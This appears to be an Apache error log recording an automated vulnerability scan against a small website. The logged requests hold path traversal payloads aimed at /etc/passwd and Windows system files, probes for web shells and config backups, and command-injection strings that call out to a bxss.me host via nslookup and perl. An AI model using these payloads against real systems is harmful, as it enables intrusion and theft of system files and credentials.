[Thu Jul 08 02:42:49.217044 2021] [core:error] [pid 17695] [client 27.147.202.214:14783] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:49.525906 2021] [core:error] [pid 17649] [client 27.147.202.214:14876] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 02:42:49.735887 2021] [core:error] [pid 17174] [client 27.147.202.214:14846] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 02:42:49.827077 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/soap.php' not found or unable to stat
[Thu Jul 08 02:42:50.506190 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/soap.php' not found or unable to stat
[Thu Jul 08 02:42:50.613620 2021] [php7:error] [pid 17774] [client 27.147.202.214:5899] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:50.616962 2021] [deflate:error] [pid 17614] [client 27.147.202.214:5426] AH01383: unable to init Zlib: deflateInit2 returned -4: URL /css/bootstrap.min.css
[Thu Jul 08 02:42:50.976608 2021] [core:error] [pid 17678] [client 27.147.202.214:5911] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:51.070842 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/soap.php' not found or unable to stat
[Thu Jul 08 02:42:51.503516 2021] [php7:error] [pid 16532] [client 27.147.202.214:5919] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:51.570266 2021] [core:error] [pid 17766] [client 27.147.202.214:5895] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:51.613930 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/apc.php' not found or unable to stat
[Thu Jul 08 02:42:51.691540 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:42:51.967958 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/login.php' not found or unable to stat
[Thu Jul 08 02:42:52.308677 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:42:52.607487 2021] [authz_core:error] [pid 17652] [client 27.147.202.214:14792] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/.htaccess
[Thu Jul 08 02:42:52.929440 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:42:53.088104 2021] [core:error] [pid 17102] [client 27.147.202.214:5910] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 02:42:53.272499 2021] [core:error] [pid 17284] [client 27.147.202.214:11419] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 02:42:53.363602 2021] [php7:error] [pid 17649] [client 27.147.202.214:5921] script '/var/www/html/wilkescw.com/phpinfo.php' not found or unable to stat
[Thu Jul 08 02:42:53.378170 2021] [core:error] [pid 17755] [client 27.147.202.214:5904] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:53.538420 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:42:53.752167 2021] [php7:error] [pid 17754] [client 27.147.202.214:5378] script '/var/www/html/wilkescw.com/r57shell.php' not found or unable to stat
[Thu Jul 08 02:42:53.807893 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/webadmin.php' not found or unable to stat
[Thu Jul 08 02:42:53.954732 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/pi.php' not found or unable to stat
[Thu Jul 08 02:42:54.041436 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/r57.php' not found or unable to stat
[Thu Jul 08 02:42:54.152648 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:42:54.325987 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/r58.php' not found or unable to stat
[Thu Jul 08 02:42:54.581783 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/php.php' not found or unable to stat
[Thu Jul 08 02:42:54.653360 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/c99shell.php' not found or unable to stat
[Thu Jul 08 02:42:54.888282 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:42:54.978087 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/c99.php' not found or unable to stat
[Thu Jul 08 02:42:55.287805 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/nstview.php' not found or unable to stat
[Thu Jul 08 02:42:55.440105 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/i.php' not found or unable to stat
[Thu Jul 08 02:42:55.559452 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:42:55.607653 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/nst.php' not found or unable to stat
[Thu Jul 08 02:42:55.933708 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/rst.php' not found or unable to stat
[Thu Jul 08 02:42:56.257034 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/r57eng.php' not found or unable to stat
[Thu Jul 08 02:42:56.315768 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/test.php' not found or unable to stat
[Thu Jul 08 02:42:56.579993 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/shell.php' not found or unable to stat
[Thu Jul 08 02:42:56.644919 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/temp.php' not found or unable to stat
[Thu Jul 08 02:42:56.812844 2021] [php7:error] [pid 16694] [client 27.147.202.214:5926] script '/var/www/html/wilkescw.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:42:56.903307 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/dra.php' not found or unable to stat
[Thu Jul 08 02:42:56.974666 2021] [php7:error] [pid 17759] [client 27.147.202.214:5916] script '/var/www/html/wilkescw.com/info.php' not found or unable to stat
[Thu Jul 08 02:42:57.227743 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/r.php' not found or unable to stat
[Thu Jul 08 02:42:57.416361 2021] [core:error] [pid 17752] (36)File name too long: [client 27.147.202.214:5893] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 02:42:57.518288 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/lol.php' not found or unable to stat
[Thu Jul 08 02:42:57.808058 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/zehir.php' not found or unable to stat
[Thu Jul 08 02:42:58.093411 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:42:58.124556 2021] [core:error] [pid 16532] [client 27.147.202.214:5919] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 02:42:58.378172 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:42:58.506993 2021] [php7:error] [pid 17743] [client 27.147.202.214:14820] script '/var/www/html/wilkescw.com/css/apc.php' not found or unable to stat
[Thu Jul 08 02:42:58.601771 2021] [authz_core:error] [pid 17614] [client 27.147.202.214:5426] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/css/.htaccess
[Thu Jul 08 02:42:58.665491 2021] [core:error] [pid 17750] (36)File name too long: [client 27.147.202.214:14841] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 02:42:58.692065 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:42:59.045750 2021] [core:error] [pid 16509] [client 27.147.202.214:1367] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:59.168099 2021] [php7:error] [pid 17687] [client 27.147.202.214:14804] script '/var/www/html/wilkescw.com/css/phpinfo.php' not found or unable to stat
[Thu Jul 08 02:42:59.263100 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/r57shell.php' not found or unable to stat
[Thu Jul 08 02:42:59.404298 2021] [php7:error] [pid 17765] [client 27.147.202.214:14843] script '/var/www/html/wilkescw.com/css/webadmin.php' not found or unable to stat
[Thu Jul 08 02:42:59.579647 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/r57.php' not found or unable to stat
[Thu Jul 08 02:42:59.721585 2021] [core:error] [pid 17765] [client 27.147.202.214:14843] AH00126: Invalid URI in request GET /fonts/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:42:59.808585 2021] [php7:error] [pid 17699] [client 27.147.202.214:5892] script '/var/www/html/wilkescw.com/css/pi.php' not found or unable to stat
[Thu Jul 08 02:42:59.905218 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/r58.php' not found or unable to stat
[Thu Jul 08 02:43:00.231215 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/c99shell.php' not found or unable to stat
[Thu Jul 08 02:43:00.442748 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/css/php.php' not found or unable to stat
[Thu Jul 08 02:43:00.559016 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/c99.php' not found or unable to stat
[Thu Jul 08 02:43:00.760169 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/css/i.php' not found or unable to stat
[Thu Jul 08 02:43:00.875769 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/nstview.php' not found or unable to stat
[Thu Jul 08 02:43:00.938295 2021] [core:error] [pid 17801] (36)File name too long: [client 27.147.202.214:1401] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 02:43:00.939220 2021] [php7:error] [pid 17615] [client 27.147.202.214:1399] script '/var/www/html/wilkescw.com/fonts/p45ruuevq2rc.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:43:01.080383 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/css/test.php' not found or unable to stat
[Thu Jul 08 02:43:01.198688 2021] [php7:error] [pid 17767] [client 27.147.202.214:14848] script '/var/www/html/wilkescw.com/~config.php' not found or unable to stat
[Thu Jul 08 02:43:01.199325 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/css/nst.php' not found or unable to stat
[Thu Jul 08 02:43:01.398170 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/css/temp.php' not found or unable to stat
[Thu Jul 08 02:43:01.504239 2021] [php7:error] [pid 17767] [client 27.147.202.214:14848] script '/var/www/html/wilkescw.com/css/rst.php' not found or unable to stat
[Thu Jul 08 02:43:01.690146 2021] [php7:error] [pid 17311] [client 27.147.202.214:14874] script '/var/www/html/wilkescw.com/css/info.php' not found or unable to stat
[Thu Jul 08 02:43:01.787928 2021] [php7:error] [pid 17804] [client 27.147.202.214:1406] script '/var/www/html/wilkescw.com/!config.php' not found or unable to stat
[Thu Jul 08 02:43:01.803530 2021] [php7:error] [pid 17767] [client 27.147.202.214:14848] script '/var/www/html/wilkescw.com/css/r57eng.php' not found or unable to stat
[Thu Jul 08 02:43:02.109395 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/shell.php' not found or unable to stat
[Thu Jul 08 02:43:02.428746 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/dra.php' not found or unable to stat
[Thu Jul 08 02:43:02.741610 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/r.php' not found or unable to stat
[Thu Jul 08 02:43:03.590125 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/lol.php' not found or unable to stat
[Thu Jul 08 02:43:03.913607 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/zehir.php' not found or unable to stat
[Thu Jul 08 02:43:04.984187 2021] [php7:error] [pid 17750] [client 27.147.202.214:1414] script '/var/www/html/wilkescw.com/config (another copy).php' not found or unable to stat
[Thu Jul 08 02:43:05.105326 2021] [negotiation:error] [pid 17808] [client 27.147.202.214:1410] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:43:05.300510 2021] [php7:error] [pid 17750] [client 27.147.202.214:1414] script '/var/www/html/wilkescw.com/config (copy).php' not found or unable to stat
[Thu Jul 08 02:43:05.315366 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:43:05.424351 2021] [negotiation:error] [pid 17808] [client 27.147.202.214:1410] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:43:06.202880 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config - Copy.php' not found or unable to stat
[Thu Jul 08 02:43:06.524206 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config - Copy (2).php' not found or unable to stat
[Thu Jul 08 02:43:06.670184 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:43:06.825523 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/Copy of config.php' not found or unable to stat
[Thu Jul 08 02:43:07.009705 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/css/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:43:07.152465 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/Copy of Copy of config.php' not found or unable to stat
[Thu Jul 08 02:43:07.441287 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/Copy (2) of config.php' not found or unable to stat
[Thu Jul 08 02:43:07.735527 2021] [core:error] [pid 16312] (36)File name too long: [client 27.147.202.214:5909] AH00036: access to /;(nslookup hitpldblzwlai54261.bxss.me||perl -e "gethostbyname('hitpldblzwlai54261.bxss.me')")|(nslookup hitpldblzwlai54261.bxss.me||perl -e "gethostbyname('hitpldblzwlai54261.bxss.me')")&(nslookup hitpldblzwlai54261.bxss.me||perl -e "gethostbyname('hitpldblzwlai54261.bxss.me')")/bootstrap.min.css failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitpldblzwlai54261.bxss.me||perl -e "gethostbyname('hitpldblzwlai54261.bxss.me')")|(nslookup hitpldblzwlai54261.bxss.me||perl -e "gethostbyname('hitpldblzwlai54261.bxss.me')")&(nslookup hitpldblzwlai54261.bxss.me||perl -e "gethostbyname('hitpldblzwlai54261.bxss.me')")')
[Thu Jul 08 02:43:07.737493 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/Copy_(1)_of_config.php' not found or unable to stat
[Thu Jul 08 02:43:08.249892 2021] [core:error] [pid 17801] [client 27.147.202.214:1401] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:08.602803 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/fonts/apc.php' not found or unable to stat
[Thu Jul 08 02:43:08.884155 2021] [core:error] [pid 16312] [client 27.147.202.214:5909] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:43:09.173020 2021] [authz_core:error] [pid 17798] [client 27.147.202.214:1400] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/fonts/.htaccess
[Thu Jul 08 02:43:09.743356 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/phpinfo.php' not found or unable to stat
[Thu Jul 08 02:43:09.934012 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config1.php' not found or unable to stat
[Thu Jul 08 02:43:10.060796 2021] [core:error] [pid 17803] [client 27.147.202.214:1405] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 02:43:10.210637 2021] [php7:error] [pid 16645] [client 27.147.202.214:14847] script '/var/www/html/wilkescw.com/fonts/webadmin.php' not found or unable to stat
[Thu Jul 08 02:43:10.261142 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config2.php' not found or unable to stat
[Thu Jul 08 02:43:10.334267 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/pi.php' not found or unable to stat
[Thu Jul 08 02:43:10.924364 2021] [php7:error] [pid 17809] [client 27.147.202.214:1407] script '/var/www/html/wilkescw.com/app_dev.php' not found or unable to stat
[Thu Jul 08 02:43:10.955545 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/php.php' not found or unable to stat
[Thu Jul 08 02:43:11.253586 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/i.php' not found or unable to stat
[Thu Jul 08 02:43:11.253803 2021] [authz_core:error] [pid 17804] [client 27.147.202.214:1406] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/.htaccess~
[Thu Jul 08 02:43:11.571574 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/test.php' not found or unable to stat
[Thu Jul 08 02:43:11.573124 2021] [authz_core:error] [pid 17804] [client 27.147.202.214:1406] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/.htaccess.old
[Thu Jul 08 02:43:11.581912 2021] [core:error] [pid 17808] (36)File name too long: [client 27.147.202.214:1410] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 02:43:11.797601 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config (3rd copy).php' not found or unable to stat
[Thu Jul 08 02:43:11.886232 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/temp.php' not found or unable to stat
[Thu Jul 08 02:43:11.888132 2021] [authz_core:error] [pid 17804] [client 27.147.202.214:1406] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/.htaccess.save
[Thu Jul 08 02:43:11.967988 2021] [core:error] [pid 17353] (36)File name too long: [client 27.147.202.214:1870] AH00036: access to /;(nslookup hitqfcwsbcsijfe186.bxss.me||perl -e "gethostbyname('hitqfcwsbcsijfe186.bxss.me')")|(nslookup hitqfcwsbcsijfe186.bxss.me||perl -e "gethostbyname('hitqfcwsbcsijfe186.bxss.me')")&(nslookup hitqfcwsbcsijfe186.bxss.me||perl -e "gethostbyname('hitqfcwsbcsijfe186.bxss.me')")/font-awesome.min.css failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitqfcwsbcsijfe186.bxss.me||perl -e "gethostbyname('hitqfcwsbcsijfe186.bxss.me')")|(nslookup hitqfcwsbcsijfe186.bxss.me||perl -e "gethostbyname('hitqfcwsbcsijfe186.bxss.me')")&(nslookup hitqfcwsbcsijfe186.bxss.me||perl -e "gethostbyname('hitqfcwsbcsijfe186.bxss.me')")')
[Thu Jul 08 02:43:12.092537 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config (third copy).php' not found or unable to stat
[Thu Jul 08 02:43:12.167142 2021] [php7:error] [pid 17798] [client 27.147.202.214:1400] script '/var/www/html/wilkescw.com/fonts/info.php' not found or unable to stat
[Thu Jul 08 02:43:12.179090 2021] [core:error] [pid 17809] [client 27.147.202.214:1407] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:43:12.380122 2021] [php7:error] [pid 17353] [client 27.147.202.214:1870] script '/var/www/html/wilkescw.com/fonts/r57shell.php' not found or unable to stat
[Thu Jul 08 02:43:12.380748 2021] [php7:error] [pid 17765] [client 27.147.202.214:1402] script '/var/www/html/wilkescw.com/config (4th copy).php' not found or unable to stat
